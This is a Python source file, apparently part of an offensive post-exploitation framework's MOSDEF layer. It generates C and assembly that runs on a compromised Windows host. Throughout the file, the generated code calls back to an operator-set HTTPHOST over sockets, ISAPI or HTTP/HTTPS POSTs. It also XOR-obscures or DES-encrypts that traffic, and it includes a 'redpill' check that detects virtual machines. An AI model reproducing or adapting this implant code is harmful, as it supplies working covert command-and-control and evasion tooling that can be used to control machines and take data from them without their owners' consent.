#! /usr/bin/env python

"""
the win32 remote resolver. A kind of combination of libc and a few other things...
"""

MAXCACHESIZE=1000

from remoteresolver import remoteresolver
import threading
import random
from internal import devlog

class win32remoteresolver(remoteresolver):
        def __init__(self, proc = 'i386', version = None):
                devlog("win32remoteresolver", "Initializing win32remoteresolver")

                # toggles the wrapper functions for send/recv in HTTP MOSDEF mode
                self.httpmosdef = False
                if hasattr(self, 'URLFD') and self.URLFD:
                        devlog('win32remoteresolver', 'Send/Recv to HTTP MOSDEF Mode ..')
                        self.httpmosdef = True

                if hasattr(self, "fd"):
                        devlog("win32remoteresolver", "Warning: reinitializing! Our FD=%s"%self.fd)
                self.isapidict={}
                #self.fd=1
                self.arch="X86"
                self.functioncache={}
                self.localcache={}
                self.xorkey=random.randint(1,250)

                remoteresolver.__init__(self, 'Win32', proc, version)
                #self.initLocalFunctions() #XXX: above already calls initLocalFunctions ..

                self.remoteFunctionsUsed={} #a list of functions we've already used, so we don't double-define
                self.remotefunctioncache={}

                self.remotefunctioncache["kernel32.dll|getprocaddress"]=0x01020304
                self.remotefunctioncache["ws2_32.dll|send"]=0x01020304
                #self.compilelock=threading.RLock()
        
        def getremote(self,func):
                #mostly here for testing
                #print "win32remoteresolver called for %s!"%func
                if func in self.remotefunctioncache:
                        #print "Found: returning."
                        return self.remotefunctioncache[func]
                code="""
                #import "remote", "kernel32.dll|getprocaddress" as "getprocaddress"
                //#import "int", "libaddr" as "libaddr"
                //#import "string", "procedure" as "procedure"
                #import "local", "sendint" as "sendint"
                #import "local", "debug" as "debug"
                void main()
                {
                unsigned int i;
                //debug();
                //i=getprocaddress(libaddr, procedure);
                sendint(i);
                }
                """
                self.savefunctioncache()
                self.clearfunctioncache()
                request=self.compile(code,{})
                self.restorefunctioncache()
                #print "Saving %s to remotefunctioncache"%func
                self.remotefunctioncache[func]=0x01020304
                return 0x01020304

        
        def initLocalFunctions(self, DES=False, hCryptKey=0):
                #print "initLocalFunctions"
                #includes
                self.localfunctions["fstat.h"]=("header","""
                //this is from the kernel .h, since the libc one is not what the
                //system call returns
                struct stat {
                unsigned short st_dev;
                unsigned short __pad1;
                unsigned long st_ino;
                unsigned short st_mode;
                unsigned short st_nlink;
                unsigned short st_uid;
                unsigned short st_gid;
                unsigned short st_rdev;
                unsigned short __pad2;
                unsigned long  st_size;
                unsigned long  st_blksize;
                unsigned long  st_blocks;
                unsigned long  st_atime;
                unsigned long  __unused1;
                unsigned long  st_mtime;
                unsigned long  __unused2;
                unsigned long  st_ctime;
                unsigned long  __unused3;
                unsigned long  __unused4;
                unsigned long  __unused5;
                };


                """)

                #arg1 is system call to call
                #arg2 is our argument to this system call
                self.localfunctions["rawsyscall"] = ("asm", """
                rawsyscall:
                pushl %ebp
                mov %esp, %ebp
                     push %edx
                     mov 0x8(%ebp), %eax
                     mov 0xc(%ebp), %edx
                     push %edx
                     mov %esp, %edx
                     int $0x2e
                     add $4, %esp
                     pop %edx
                movl %ebp,%esp
                popl %ebp
                ret $8
                """)
                
                self.localfunctions["checkvm"]=("asm","""
                checkvm:
                xorl %eax,%eax
                subl $6,%esp
                sidt (%esp)
                movb 0x5(%esp),%al
                addl $6,%esp
                // jge 0xd0, 0xff --> vmware, 0xe8 virtual pc
                // from joanna's redpill thingy
                cmpb $0xd0,%al
                jg virtualmachine
                xorl %eax,%eax

                virtualmachine:
                // return value of !zero == virtualmachine
                ret
                """)
                
                self.localfunctions["callbuf"]=("asm", """
                callbuf:
                
                pushl %ebp
                movl %esp,%ebp
                
                pushad
                
                movl 8(%ebp),%edi
                call %edi
                
                popad
                
                movl %ebp,%esp
                popl %ebp
                
                ret $4
                """)

                self.localfunctions["socket.h"]=("header","""
                        struct sockaddr {
                                unsigned short int family;
                                char data[14];
                        };
                        
                        struct sockaddr_in {
                                unsigned short int family;
                                unsigned short int port;
                                unsigned int addr;
                                char pad[6];
                        };
                """)
                
                
                #(type,code)
                
                self.localfunctions["sendint"]=("c","""
                #import "local", "writeblock2self" as "writeblock2self"
                void sendint(unsigned int myint){
                        int i;
                        i=myint;
                        writeblock2self(&i,4);
                }
                        
                """)
                
                devlog("win32remoteresolver","Initialized sendint with fd=%s"%self.fd)
                
                # patch sendint to be cryptSize
                if DES == True:
                        self.localfunctions["sendstring"]=("c","""
                        #import "local","strlen" as "strlen"
                        #import "local","sendint" as "sendint"
                        #import "local","writeblock2self" as "writeblock2self"
                        void sendstring(char * instr) {
                        int cryptSize;
                        cryptSize = strlen(instr);
                        cryptSize = cryptSize + 4;
                        while (cryptSize % 8)
                        {
                          cryptSize = cryptSize + 1;
                        }
                        sendint(cryptSize);
                        writeblock2self(instr,strlen(instr));
                        }
                        """)
                else:
                        self.localfunctions["sendstring"]=("c","""
                        #import "local","strlen" as "strlen"
                        #import "local","sendint" as "sendint"
                        #import "local","writeblock2self" as "writeblock2self"
                        void sendstring(char * instr) {
                        sendint(strlen(instr));
                        writeblock2self(instr,strlen(instr));
                        }
                        """)                        

                # patch sendint to cryptsize
                if DES == True: 
                        self.localfunctions["sendunistring2self"]=("c","""
                        #import "local","wstrlen" as "wstrlen"
                        #import "local","sendint" as "sendint"
                        #import "local","writeblock2self" as "writeblock2self"
                        void sendunistring2self(short * instr) {
                        int size;
                        int cryptSize;
                        
                        size=wstrlen(instr);
                        size=size*2;
                        
                        cryptSize = size + 4;
                        while(cryptSize % 8)
                        {
                          cryptSize = cryptSize + 1;
                        }
                        
                        sendint(cryptSize);
                        writeblock2self(instr,size);
                        }
                        """)
                else:
                        self.localfunctions["sendunistring2self"]=("c","""
                        #import "local","wstrlen" as "wstrlen"
                        #import "local","sendint" as "sendint"
                        #import "local","writeblock2self" as "writeblock2self"
                        void sendunistring2self(short * instr) {
                        int size;
                        size=wstrlen(instr);
                        size=size*2;
                        sendint(size);
                        writeblock2self(instr,size);
                        }
                        """)
                        
                self.localfunctions["debug"]=("asm","""
                debug:
                .byte 0xcc
                ret
                """)
                
                #
                #end syscalls, begin libc functions
                #
                
                        
                #counts short's in the string till 0x0000!
                self.localfunctions["wstrlen"]=("c","""
                int wstrlen(short *instr) {
                        int i;
                        short * p;
                        i=0;
                        p=instr;
                        while (*p!=0) {
                        p=p+1;
                        i=i+1;
                        }
                        return i;
                }
                """)
                        
                
                self.localfunctions["xorblock"]=("c","""
                //xor with a5 for obscurities sake
                int xorblock(char * instr, int size) {
                        int i;
                        char *p;
                        char newbyte;
                        char key;
                        
                        key=XORKEY;
                        i=0;
                        p=instr;
                        while (i<size) {
                        i=i+1;
                        newbyte=*p;
                        newbyte=newbyte^key;
                        *p=newbyte;
                        p=p+1;
                        }
                        return i;
                }
                """.replace("XORKEY","%s"%self.xorkey))
                print "XORKEY=%x"%self.xorkey
                
                #uses the reliable writeblock
                self.localfunctions["send_array"]=("c","""
                #import "local","writeblock" as "writeblock"
                //#import "local","strlen" as "strlen"
                #import "local","sendint" as "sendint"
                int send_array(int fd, char * outstr,int size) {
                        sendint(size);
                        writeblock(fd,outstr,size);
                }
                """)
                
                #uses the reliable writeblock
                self.localfunctions["writestring"]=("c","""
                #import "local","send_array" as "send_array"
                #import "local","strlen" as "strlen"
                int writestring(int fd, char * outstr) {
                        send_array(fd,outstr,strlen(outstr));
                }
                """)
                
                #our reliable reading function
                self.localfunctions["readdata"]=("c","""
                #import "remote","ws2_32.dll|recv" as "recv"
                //#import "local","strlen" as "strlen"
                int readdata(int fd, char * outstr,int size) {
                        int left;
                        int i;
                        char * p;
                        left=size;
                        p=outstr;
                        while (left > 0) {
                        i=recv(fd,p,left,0);
                        if (i<0) {
                                return 0;
                        }
                        left=left-i;
                        p=p+i;
                        }
                        return 1; 
                }
                """)

                        
                
                if self.isapidict=={}:
                        if self.httpmosdef == False:
                                code="""
                                #import "local", "readdata" as "readdata"
        
                                int readdatafromself(char * data,int size) {
                                int ret;
                                ret=readdata(FD,data,size);
                                return ret;
                                }
                                """.replace("FD",str(self.fd))

                        # we have an URLFD .. this means we're in HTTP-MOSDEF mode
                        # read and write are basically the same in HTTP-MOSDEF, only
                        # only writes set their data as a 'MD:' header .. otherwise
                        # it's just an internetopenurla call

                        else:
                                code = """
                                #import "remote", "wininet.dll|internetopena" as "internetopena"
                                #import "remote", "wininet.dll|internetsetoptiona" as "internetsetoptiona"
                                #import "remote", "wininet.dll|internetreadfile" as "internetreadfile"
                                #import "remote", "wininet.dll|internetclosehandle" as "internetclosehandle"
                                #import "remote", "wininet.dll|internetconnecta" as "internetconnecta"
                                #import "remote", "wininet.dll|httpopenrequesta" as "httpopenrequesta"
                                #import "remote", "wininet.dll|httpaddrequestheadersa" as "httpaddrequestheadersa"
                                #import "remote", "wininet.dll|httpsendrequesta" as "httpsendrequesta"

                                #import "local", "debug" as "debug"
        
                                int http_readdata(char *url, char *buf, int size)
                                {
                                    // XXX: eureka moment, there is no reason we
                                    // XXX: can't just send along the size we want
                                    // XXX: from our outbuffer in a header, when
                                    // XXX: no size is sent, we assume we want all
                                    // XXX: data available .. this will solve all
                                    // XXX: issues with buffering.

                                    int bRead;
                                    int cSize;

                                    int hConnect;
                                    int hRequest;
                                    int ret;
                                    int options;

                                    char szHead[10];
                                    char *p;

                                    // XXX: if size is 0, we just return .. end of something
                                    if (size == 0)
                                    {
                                        return 1;
                                    }

                                    // the actual size is part of a POST to prevent bad char nonsense
                                    szHead[0] = 'S';
                                    szHead[1] = 'Z';
                                    szHead[2] = ':';
                                    szHead[3] = ' ';
                                    szHead[4] = 'X';

                                    szHead[5] = 0x0d;
                                    szHead[6] = 0x0a;
                                    szHead[7] = 0x0d;
                                    szHead[8] = 0x0a;
                                    szHead[9] = 0x00;

                                    // needs 443 for HTTPS ..
                                    hConnect = internetconnecta(INETHANDLE, "HTTPHOST", HTTPPORT, 0, 0, 3, 0, 0);
                                    hRequest = httpopenrequesta(hConnect, "POST", "/c/HTTPID", 0, 0, 0, FLAGS, 0);
                                    // do the additional cert options on the hRequest handle
                                    options = 0x7fffffff;
                                    // timeout
                                    internetsetoptiona(hRequest, 6, &options, 4);
                                    options = 0x00003380;
                                    // cert muck
                                    internetsetoptiona(hRequest, 31, &options, 4);

                                    // add the SZ marker header
                                    httpaddrequestheadersa(hRequest, szHead, 9, 0x20000000);
                                    // send the actual POST body data .. which is a len in this case
                                    ret = httpsendrequesta(hRequest, 0, 0, &size, 4);

                                    cSize = size;
                                    p = buf;
                                    // XXX: redundant read loop ;)
                                    while (cSize)
                                    {
                                        internetreadfile(hRequest, p, cSize, &bRead);
                                        cSize = cSize - bRead;
                                        p = p + bRead;
                                    }
                                                                            
                                    internetclosehandle(hRequest);
                                    internetclosehandle(hConnect);

                                    return size;
                                }

                                int readdatafromself(char * data, int size) {
                                    int ret;
                                    ret = http_readdata("FD", data, size);
                                    return ret;
                                }
                                """
                                code = code.replace("HTTPHOST", str(self.HTTPHOST))
                                code = code.replace("HTTPPORT", str(self.HTTPPORT))
                                code = code.replace("HTTPID", str(self.HTTPID))
                                code = code.replace("INETHANDLE", str(int(self.fd)))
                                if self.SSL == True:
                                    devlog('http_mosdef', 'Setting remoteresolver flags for HTTPS MOSDEF!')
                                    code = code.replace("FLAGS", "0x84C03100")
                                else:
                                    code = code.replace("FLAGS", "0x80400100")
                else:
                        code="""
                        #import "remote", "ecb|readclient" as "readclient"
                        int readdatafromself(char * data,int size) {
                                int ret;
                                char *p;
                                int readsize;
                                int wanted;
                                
                                readsize=0;
                                p=data;
                                while (readsize<size) {
                                wanted=size-readsize;
                                ret=readclient(CONTEXT,p,&wanted);
                                readsize=readsize+wanted;
                                p=p+wanted;
                                }
                                return readsize;
                        }
                        """.replace("CONTEXT",str(self.context))
                self.localfunctions["readdatafromself"]=("c",code)
        
                #uses the reliable readdata
                self.localfunctions["readintfromself"]=("c","""
                #import "local","readdatafromself" as "readdatafromself"
                int readintfromself() {
                                char buf[4];
                        int *p;
                        int ret;
                        p=buf;
                        readdatafromself(buf,4);
                        ret=*p; //casting crap
                        return ret;
                }
                """)
                
                #uses the reliable readdata
                self.localfunctions["readstringfromself"]=("c","""
                #import "local","readdatafromself" as "readdatafromself"
                #import "local","readintfromself" as "readintfromself"
                #import "local", "malloc" as "malloc"
                //#import "local", "debug" as "debug"

                char * readstringfromself() {
                        char * buf;
                        int size;
                        //debug();
                        size=readintfromself();
                        buf=malloc(size);
                        readdatafromself(buf, size);
                        return buf;
                }
                """)

                
                #the problem here is we may not have GlobalAlloc in our cache, and
                #so we can't call this routine from getprocaddress or loadlibrary, of course
                self.localfunctions["malloc"]=("c","""
                #import "remote","kernel32.dll|GlobalAlloc" as "GlobalAlloc"
                char * malloc(int size) {
                        char * buf;
                        buf=GlobalAlloc(0,size);
                        return buf;
                }
                """)
                
                
                #the problem here is we may not have GlobalAlloc in our cache, and
                #so we can't call this routine from getprocaddress or loadlibrary, of course
                self.localfunctions["free"]=("c","""
                #import "remote","kernel32.dll|GlobalFree" as "GlobalFree"
                int free(int handle) {
                        int ret;
                        ret=GlobalFree(handle);
                        return ret;
                }
                """)
                
                #uses the reliable writeblock
                self.localfunctions["sendblock"]=("c","""
                #import "local","writeblock" as "writeblock"
                #import "local","sendint" as "sendint"
                int sendblock(int fd, char * buf, int size) {
                        sendint(size);
                        writeblock(fd,buf,size);
                }
                """)

                
                # patch the sendint to be actual crypt size
                code = ""
                if DES == True:
                        code="""
                        #import "local","writeblock2self" as "writeblock2self"
                        #import "local","sendint" as "sendint"
                        
                        int senddata2self(char * buf, int size) {
                        int cryptSize;
                        
                        cryptSize = size + 4;
                        while (cryptSize % 8)
                        {
                          cryptSize = cryptSize + 1;
                        }
                        sendint(cryptSize);
                        writeblock2self(buf,size);
                        }
                        """
                else:
                        code="""
                        #import "local","writeblock2self" as "writeblock2self"
                        #import "local","sendint" as "sendint"
                        
                        int senddata2self(char * buf, int size) {
                        sendint(size);
                        writeblock2self(buf,size);
                        }
                        """
                self.localfunctions["senddata2self"]=("c",code)
        
                #our reliable writing function
                self.localfunctions["writeblock"]=("c","""
                #import "remote","ws2_32.dll|send" as "send"
                int writeblock(int fd, char * instr,int size) {
                        int left;
                        int i;
                        char * p;
                        left=size;
                        p=instr;
                        while (left > 0) {
                        i=send(fd,p,left,0);
                        if (i<0) {
                                return 0;
                        }
                        left=left-i;
                        p=p+i;
                        }
                        return 1; 
                }
                """)

                if self.isapidict == {} and DES == False:
                        if self.httpmosdef == False:
                                code = """
                                #import "local","writeblock" as "writeblock"
                                //#import "local","sendint" as "sendint"
                                #import "local","xorblock" as "xorblock"
                                int writeblock2self(char * buf, int size) {
                                    xorblock(buf,size);
                                    writeblock(FD,buf,size);
                                    xorblock(buf,size); //restore
                                }
                                """
                                code = code.replace("FD",str(int(self.fd)))
                                devlog("win32remoteresolver", "writeblock2self compiled with fd=%s"%self.fd)
                                #if self.fd==-1:
                                #        devlog("win32remoteresolver","ERROR: fd==-1 and writeblock2self used")
                                #        import traceback
                                #        traceback.print_stack()
                        else:
                        # HTTP-MOSDEF write data
                                code = """
                                #import "remote", "wininet.dll|internetsetoptiona" as "internetsetoptiona"
                                #import "remote", "wininet.dll|internetopena" as "internetopena"
                                #import "remote", "wininet.dll|internetconnecta" as "internetconnecta"
                                #import "remote", "wininet.dll|httpopenrequesta" as "httpopenrequesta"
                                #import "remote", "wininet.dll|httpaddrequestheadersa" as "httpaddrequestheadersa"
                                #import "remote", "wininet.dll|httpsendrequesta" as "httpsendrequesta"

                                #import "remote", "wininet.dll|internetclosehandle" as "internetclosehandle"
                                #import "remote", "kernel32.dll|virtualalloc" as "virtualalloc"
                                #import "remote", "kernel32.dll|virtualfree" as "virtualfree"

                                #import "local", "xorblock" as "xorblock"
                                #import "local", "debug" as "debug"
        
                                // writes are POSTS in HTTP MOSDEF
                                int http_writeblock(char *url, char *buf, int size)
                                {
                                    int hConnect;
                                    int hRequest;
                                    int ret;
                                    int options;

                                    // needs 443 for HTTPS ..
                                    hConnect = internetconnecta(INETHANDLE, "HTTPHOST", HTTPPORT, 0, 0, 3, 0, 0);
                                    hRequest = httpopenrequesta(hConnect, "POST", "/c/HTTPID", 0, 0, 0, FLAGS, 0);
                                    // do the additional cert options on the hRequest handle
                                    options = 0x7fffffff;
                                    // timeout
                                    internetsetoptiona(hRequest, 6, &options, 4);
                                    options = 0x00003380;
                                    // cert muck
                                    internetsetoptiona(hRequest, 31, &options, 4);
                                    // send the actual POST body data
                                    ret = httpsendrequesta(hRequest, 0, 0, buf, size);

                                    internetclosehandle(hRequest);
                                    internetclosehandle(hConnect);

                                    return size;
                                }

                                int writeblock2self(char * buf, int size) {
                                    xorblock(buf, size);
                                    http_writeblock("FD", buf, size);
                                    xorblock(buf, size); //restore
                                }
                                """
                                code = code.replace("HTTPHOST", str(self.HTTPHOST))
                                code = code.replace("HTTPPORT", str(self.HTTPPORT))
                                code = code.replace("HTTPID", str(self.HTTPID))
                                code = code.replace("INETHANDLE", str(int(self.fd)))
                                if self.SSL == True:
                                    devlog('http_mosdef', 'Setting flags for HTTPS MOSDEF in win32remoteresolver')
                                    code = code.replace("FLAGS", "0x84C03100")
                                else:
                                    code = code.replace("FLAGS", "0x80400100")


                # XXX self.node.shell.hCryptKey is our crypt key handle post toDES
                # XXX switch this to our existing reliable read/write functions
                
                elif self.isapidict == {} and DES == True:
                        
                        print "[!] Switching to DES MOSDEF writeblock2self ..."
                        code = """
                        #import "remote", "advapi32.dll|CryptEncrypt" as "CryptEncrypt"
                        #import "remote", "advapi32.dll|CryptSetKeyParam" as "CryptSetKeyParam"
                        #import "remote", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
                        #import "remote", "kernel32.dll|VirtualFree" as "VirtualFree"
                        
                        #import "local","writeblock" as "writeblock"
                        #import "local","sendint" as "sendint"
                        #import "local","xorblock" as "xorblock"
                        
                        #import "local","debug" as "debug"
                                
                        int writeblock2self(char *block, int size) 
                        {
                            char *out;
                            int oldSize;
                            int cryptSize;
                            int blockSize;
                            int mod;
                            int i;
                            int r;
                            
                            // pad char
                            char *p;
                            // IV - only used for SetKeyParam
                            char IV[8];
                            
                            oldSize = size;
                            cryptSize = oldSize + 4; // prepend len
                            
                            char pad[1024];
                            while (cryptSize % 8)
                            {
                              cryptSize = cryptSize + 1;
                            }
                                                      
                            // + 1 block size
                            blockSize = cryptSize + 8;
                            
                            // alloc block for crypt
                            out = VirtualAlloc(0, blockSize, 0x1000, 0x40);
                            if (out == 0)
                            {
                              debug(); // fatal
                            }

                            // protocol: prepend decrypted data size
                            p = &oldSize;
                            for (i = 0; i < 4; i = i + 1)
                            {
                              out[i] = p[i];
                            }
                            
                            // copy over plaintext
                            p = out + 4;
                            for (i = 0; i < oldSize; i = i + 1)
                            {
                              p[i] = block[i];
                            }
                            
                            // known pad char for control
                            for (i = oldSize; i < blockSize; i = i + 1)
                            {
                              p[i] = 'P';
                            }
                            
                            // ## init IV to 0
                            //for (i = 0; i < 8; i = i + 1)
                            //{
                            //    IV[i] = 0;
                            //}
                            // ## KP_IV is defined as 1
                            //r = CryptSetKeyParam(hCryptKey, 1, IV, 0);
                            //if (r == 0)
                            //{
                            //    debug();
                            //}
                            
                            // because des.py only handles IV's of 0, we have to do a little
                            // hack to force the IV to be re-inited to 0 for this session
                            p = "ABCDEFGHPPPPPPPP";
                            i = 8;
                            CryptEncrypt(hCryptKey, 0, 1, 0, p, &i, 16); // TRUE final resets IV 
                                                        
                            // TRUE/FALSE is 3rd arg
                            //debug();
                            i = cryptSize;
                            r = CryptEncrypt(hCryptKey, 0, 0, 0, out, &i, blockSize);                            
                            if (r == 0)
                            {
                              debug();
                            }
                            
                            // problem !
                            if (i != cryptSize)
                            {
                              debug();
                            }
                                                                                                               
                            // if all is gravy, write it out
                            if (out != 0)
                            { 
                              writeblock(FD, out, cryptSize); // XXX: should be cryptSize
                            }
                                                        
                            // free
                            VirtualFree(out);
                        }
                        """
                        code = code.replace("FD", str(int(self.fd)))
                        print "[XXX] patching writeblock2self DES with hCryptKey of: %X"% int(hCryptKey)
                        code = code.replace("hCryptKey", "0x%X"%int(hCryptKey))
                else:
                        print "Using ISAPI code in win32 remoteresolver"
                        code="""
                        #import "remote","ecb|writeclient" as "writeclient"
                        #import "local","xorblock" as "xorblock"
                        int writeblock2self(char * buf, int size) {
                        int newsize;
                        int sentsize;
                                sentsize=0;
                                xorblock(buf,size);
                                while (sentsize<size) {
                                newsize=size-sentsize;
                                writeclient(CONNID,buf,&newsize);
                                sentsize=sentsize+newsize;
                                }
                                xorblock(buf,size); //restore
                        }
                        """.replace("CONNID",str(int(self.context)))
                                
                        
                self.localfunctions["writeblock2self"]=("c",code)


                self.localfunctions["sendshort"]=("c","""
                #import "local","writeblock2self" as "writeblock2self"
                void sendshort(short tosend)
                {
                        short i;
                        i=tosend;
                        writeblock2self(&i,2);
                }
                """)

        def getRemoteFunctionCached(self,function):
                #print "looking for %s in function cache"%function
                if function in self.remoteFunctionsUsed.keys():
                        return 1
                return 0
        
        def addToRemoteFunctionCache(self,function):
                self.remoteFunctionsUsed[function]=1
                #print "Added %s to remote functions used cache"%function
                return
        
        def savefunctioncache(self):
                self.sfunctioncache=(self.functioncache,self.remoteFunctionsUsed)
                
        def restorefunctioncache(self):
                (self.functioncache,self.remoteFunctionsUsed)=self.sfunctioncache
                
        def clearfunctioncache(self):
                """Clears the function cache, and acquires a lock
                to the structure"""
                #print "Clearing function cache"
                self.remoteFunctionsUsed={}
                remoteresolver.clearfunctioncache(self)
                return

if __name__=="__main__":
        w=win32remoteresolver()
